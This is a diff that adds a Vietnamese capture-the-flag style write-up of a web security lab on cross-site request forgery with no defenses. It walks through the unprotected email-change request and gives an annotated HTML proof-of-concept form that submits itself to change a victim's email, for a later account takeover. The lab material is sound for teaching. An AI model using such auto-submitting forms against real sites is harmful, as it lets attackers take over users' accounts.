@@ -1,0 +1,21 @@
+CSRF - CSRF vulnerability with no defenses
+
+End Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter
+
+Analystic
+---------
+Bước 1: Mở trình duyệt Burp, copy link trang web vào và đăng nhập 
+Bước 2: Thực hiện update email
+Bước 3: Quan sát trong history ta thấy trong request khi update email có endpoint là /my-account/change-email và trong phần nội dung, chỉ bao gồm email="giá trị" chứ không yêu cầu csrf hay mật khẩu --> ta có thể viết lại 1 yêu cầu với nội dung mô phỏng lại quá trình update email nhưng với nội dung email khác.
+Bước 4: Vào exploit server, ta viết nội dung body của request như sau:
+<html>
+<body>
+<form action="URL của lab hiện tại" method="POST" (Vì phương thức trong gói tin gốc là POST)>
+    <input type="hidden" name="email"(vì tên trường nhập email trong trang gốc là email) value="giá trị email mà ta kiểm soát">
+</form>
+<script> document.forms[0].submit() --> sử dụng để submit form này</scrip>
+</body>
+</html>
+--> khi nhận được gói tin này, người dùng sẽ tự động submit 1 form mà nội dung bao gồm 1 trường email bị hidden với giá trị của email ta kiểm soát được --> từ đó ta có thể sử dụng email này để thay đổi mật khẩu.
+
+
